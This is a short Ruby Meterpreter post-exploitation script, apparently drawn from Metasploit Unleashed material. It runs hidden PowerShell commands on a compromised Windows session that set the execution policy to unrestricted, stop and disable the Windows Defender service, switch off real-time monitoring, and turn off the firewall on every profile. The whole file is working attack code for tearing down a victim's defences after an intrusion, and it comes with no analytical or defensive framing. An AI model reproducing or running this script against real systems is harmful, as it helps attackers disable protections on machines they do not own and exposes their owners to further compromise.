# https://www.offensive-security.com/metasploit-unleashed/custom-scripting/
# Run some powershell commands to lower defences on the machine
# Powershell execution policy unrestricted, disable windows defender / real time monitoring, disable the firewall

# Runs the commands with statuses
def lower_defences(session,cmdlst)
    print_status("Lowering Defences...")
    r=''
    session.response_timeout=120
    cmdlst.each do |cmd|
       begin
          print_status("Running command: #{cmd}")
          r = session.sys.process.execute("#{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
          while(d = r.channel.read)
             print_status("t#{d}")
          end
          r.channel.close
          r.close
       rescue ::Exception => e
          print_error("Error Running Command #{cmd}: #{e.class} #{e}")
       end
    end
 end
 
 # The commands to run
 commands = [
	'powershell -executionpolicy unrestricted -command "set-executionpolicy unrestricted -force"',
	'powershell -command "Get-Service WinDefend | Stop-Service -PassThru | Set-Service -StartupType Disabled"',
	'powershell -command "Set-MpPreference -DisableRealtimeMonitoring $true"',
	'powershell -command "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"'
]

# Run the commands
lower_defences(client,commands)
